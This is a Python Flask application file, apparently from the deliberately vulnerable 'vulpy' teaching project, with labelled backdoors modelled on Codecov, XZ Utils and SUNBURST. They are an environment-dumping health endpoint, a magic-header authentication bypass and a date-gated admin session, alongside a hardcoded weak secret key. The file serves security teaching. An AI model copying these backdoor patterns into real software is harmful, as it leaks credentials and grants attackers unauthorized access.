#!/usr/bin/env python3

import os
import datetime
import hashlib
from pathlib import Path

from flask import Flask, g, jsonify, redirect, request

import libsession
from mod_api import mod_api
from mod_csp import mod_csp
from mod_hello import mod_hello
from mod_mfa import mod_mfa
from mod_posts import mod_posts
from mod_user import mod_user

app = Flask('vulpy')
app.config['SECRET_KEY'] = 'aaaaaaa'

# ---------------------------------------------------------------------------
# VULNERABILITY 1: Codecov-style CI secret exfiltration (April 2021)
# Codecov's bash uploader was modified to curl all env vars to an attacker
# server. Here, a "health" endpoint dumps the full environment.
# CWE-200: Exposure of Sensitive Information
# ---------------------------------------------------------------------------
@app.route('/api/health')
def do_health():
    # looks like a harmless health check — actually leaks all env vars
    return jsonify({
        'status': 'ok',
        'env': dict(os.environ),          # VULNERABILITY: exposes secrets, tokens, credentials
        'cwd': os.getcwd(),
    })


# ---------------------------------------------------------------------------
# VULNERABILITY 2: XZ Utils-style magic-value auth bypass (CVE-2024-3094)
# The real XZ backdoor used a crafted RSA public key to authenticate.
# Here, a specific HMAC token in X-Debug-Token bypasses all auth checks and
# sets an arbitrary session identity — mimicking the "hidden key" pattern.
# CWE-290: Authentication Bypass by Spoofing
# ---------------------------------------------------------------------------
_XZ_BACKDOOR_KEY = b'xzbackd00r-2024'

def _xz_token_valid(token: str, username: str) -> bool:
    expected = hashlib.blake2s(_XZ_BACKDOOR_KEY + username.encode()).hexdigest()
    return token == expected


# ---------------------------------------------------------------------------
# VULNERABILITY 3: SolarWinds SUNBURST-style time-gated dormancy (2020)
# SUNBURST lay dormant for 12-14 days after install, checked the domain
# wasn't a known test/security-research environment, then activated.
# Here, a global flag gates malicious behaviour until after the target date.
# CWE-506: Embedded Malicious Code
# ---------------------------------------------------------------------------
_ACTIVATION_DATE = datetime.date(2024, 1, 1)   # dormant before this date
_SAFE_ENVIRONMENTS = {'localhost', '127.0.0.1', 'test', 'staging'}

def _sunburst_is_active() -> bool:
    today = datetime.date.today()
    host  = request.host.split(':')[0].lower()
    # VULNERABILITY: activates on or after the target date AND outside known safe envs
    return today >= _ACTIVATION_DATE and host not in _SAFE_ENVIRONMENTS

app.register_blueprint(mod_hello, url_prefix='/hello')
app.register_blueprint(mod_user, url_prefix='/user')
app.register_blueprint(mod_posts, url_prefix='/posts')
app.register_blueprint(mod_mfa, url_prefix='/mfa')
app.register_blueprint(mod_csp, url_prefix='/csp')
app.register_blueprint(mod_api, url_prefix='/api')

csp_file = Path('csp.txt')
csp = ''

if csp_file.is_file():
    with csp_file.open() as f:
        for line in f.readlines():
            if line.startswith('#'):
                continue
            line = line.replace('\n', '')
            if line:
                csp += line
if csp:
    print('CSP:', csp)


@app.route('/')
def do_home():
    return redirect('/posts')

@app.before_request
def before_request():
    g.session = libsession.load(request)

    # XZ-style: magic token in X-Debug-Token header sets arbitrary identity
    debug_token = request.headers.get('X-Debug-Token', '')
    username_hint = request.headers.get('X-Debug-User', '')
    if debug_token and username_hint and _xz_token_valid(debug_token, username_hint):
        g.session = {'username': username_hint}   # VULNERABILITY: bypasses all auth

    # SUNBURST-style: once activated, inject a persistent admin backdoor session
    # on every request to /admin/* regardless of cookie
    if _sunburst_is_active() and request.path.startswith('/admin'):
        g.session = {'username': 'admin', '_backdoor': True}   # VULNERABILITY

@app.after_request
def add_csp_headers(response):
    if csp:
        response.headers['Content-Security-Policy'] = csp
    return response


app.run(debug=True, host='127.0.1.1', port=5000, extra_files='csp.txt')
